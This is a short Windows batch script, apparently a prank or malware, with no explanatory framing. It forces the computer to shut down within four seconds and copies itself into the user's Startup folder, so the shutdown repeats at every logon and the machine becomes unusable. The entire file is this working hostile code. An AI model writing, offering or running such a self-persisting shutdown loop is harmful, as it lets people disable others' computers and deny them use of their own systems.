@echo off
setlocal

shutdown -f -s -t 4

set "startupFolder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"


set "batchFileName=%~nx0"

if exist "%startupFolder%\%batchFileName%" (
    echo already
) else (
    copy "%~f0" "%startupFolder%\%batchFileName%"
    if errorlevel 1 (
        echo Failed Exiting...
        exit /b 1
    ) else (
        echo successfully.
    )
)



endlocal